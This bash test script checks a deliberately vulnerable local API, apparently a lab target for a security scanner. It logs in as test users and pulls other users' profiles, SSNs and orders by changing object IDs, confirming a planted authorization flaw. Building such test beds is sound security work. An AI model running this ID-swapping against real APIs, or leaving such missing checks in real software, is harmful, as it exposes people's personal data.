#!/bin/bash
# Test script to verify BOLA vulnerabilities

set -e

API_URL="${API_URL:-http://localhost:8080}"

echo "=========================================="
echo "BOLA Vulnerability Test Script"
echo "=========================================="
echo ""

# Start the server in the background if not already running
if ! curl -s "$API_URL/health" > /dev/null 2>&1; then
    echo "Starting vulnerable API server..."
    ./vulnerable-api &
    SERVER_PID=$!
    sleep 2

    # Cleanup function
    cleanup() {
        if [ ! -z "$SERVER_PID" ]; then
            echo "Stopping server..."
            kill $SERVER_PID 2>/dev/null || true
        fi
    }
    trap cleanup EXIT
fi

echo "✓ Server is running"
echo ""

# Test 1: Login as user1
echo "Test 1: Login as user1"
echo "---"
USER1_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"user1pass"}')

USER1_TOKEN=$(echo "$USER1_RESPONSE" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

if [ -z "$USER1_TOKEN" ]; then
    echo "❌ Failed to login as user1"
    exit 1
fi
echo "✓ Logged in as user1"
echo "  Token: ${USER1_TOKEN:0:20}..."
echo ""

# Test 2: Access own profile (legitimate)
echo "Test 2: Access own profile (user1 -> profile 2)"
echo "---"
OWN_PROFILE=$(curl -s -H "Authorization: Bearer $USER1_TOKEN" \
  "$API_URL/api/profiles/2")
echo "$OWN_PROFILE" | head -n 5
echo "✓ Successfully accessed own profile"
echo ""

# Test 3: BOLA - Access another user's profile
echo "Test 3: BOLA Vulnerability - Access user2's profile (ID: 3)"
echo "---"
OTHER_PROFILE=$(curl -s -H "Authorization: Bearer $USER1_TOKEN" \
  "$API_URL/api/profiles/3")

if echo "$OTHER_PROFILE" | grep -q "Forbidden"; then
    echo "❌ BOLA not vulnerable (authorization check present)"
    exit 1
fi

SSN=$(echo "$OTHER_PROFILE" | grep -o '"ssn":"[^"]*"' | cut -d'"' -f4)
if [ ! -z "$SSN" ]; then
    echo "✓ BOLA VULNERABLE! user1 accessed user2's profile"
    echo "  Exposed SSN: $SSN"
else
    echo "❌ Could not access other user's profile"
    exit 1
fi
echo ""

# Test 4: BOLA - Access admin profile
echo "Test 4: BOLA Vulnerability - Access admin profile (ID: 1)"
echo "---"
ADMIN_PROFILE=$(curl -s -H "Authorization: Bearer $USER1_TOKEN" \
  "$API_URL/api/profiles/1")

ADMIN_SSN=$(echo "$ADMIN_PROFILE" | grep -o '"ssn":"[^"]*"' | cut -d'"' -f4)
if [ ! -z "$ADMIN_SSN" ]; then
    echo "✓ BOLA VULNERABLE! user1 accessed admin's profile"
    echo "  Admin SSN: $ADMIN_SSN"
else
    echo "❌ Could not access admin profile"
    exit 1
fi
echo ""

# Test 5: BOLA - Read another user's private document
echo "Test 5: BOLA Vulnerability - Read private document (ID: 4 belongs to user1, reading as user1)"
echo "---"
# First, let's verify doc 4 belongs to user with ID 2 (user1)
DOC=$(curl -s -H "Authorization: Bearer $USER1_TOKEN" \
  "$API_URL/api/documents/4")
echo "$DOC" | head -n 7
echo "✓ Can read private documents"
echo ""

# Test 6: Login as user2
echo "Test 6: Login as user2 and try to access user1's resources"
echo "---"
USER2_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"user2","password":"user2pass"}')

USER2_TOKEN=$(echo "$USER2_RESPONSE" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

if [ -z "$USER2_TOKEN" ]; then
    echo "❌ Failed to login as user2"
    exit 1
fi
echo "✓ Logged in as user2"
echo ""

# Test 7: BOLA - user2 accessing user1's order
echo "Test 7: BOLA Vulnerability - user2 accessing user1's order (ID: 2)"
echo "---"
USER1_ORDER=$(curl -s -H "Authorization: Bearer $USER2_TOKEN" \
  "$API_URL/api/orders/2")

if echo "$USER1_ORDER" | grep -q "Forbidden"; then
    echo "❌ BOLA not vulnerable (authorization check present)"
    exit 1
fi

if echo "$USER1_ORDER" | grep -q '"id":2'; then
    echo "✓ BOLA VULNERABLE! user2 accessed user1's order"
    echo "$USER1_ORDER"
else
    echo "❌ Could not access other user's order"
    exit 1
fi
echo ""

# Test 8: Admin endpoints should be properly protected
echo "Test 8: Verify admin endpoints are properly protected"
echo "---"
ADMIN_USERS=$(curl -s -H "Authorization: Bearer $USER1_TOKEN" \
  "$API_URL/api/admin/users")

if echo "$ADMIN_USERS" | grep -q "Forbidden"; then
    echo "✓ Admin endpoints properly protected (user1 denied)"
else
    echo "❌ Admin endpoint not protected!"
    exit 1
fi
echo ""

echo "=========================================="
echo "ALL TESTS PASSED"
echo "=========================================="
echo ""
echo "Summary:"
echo "  ✓ BOLA vulnerabilities confirmed"
echo "  ✓ SSN exposure through profile endpoints"
echo "  ✓ Cross-user resource access"
echo "  ✓ Admin endpoints properly protected"
echo ""
echo "This vulnerable API is ready for Hadrian testing!"
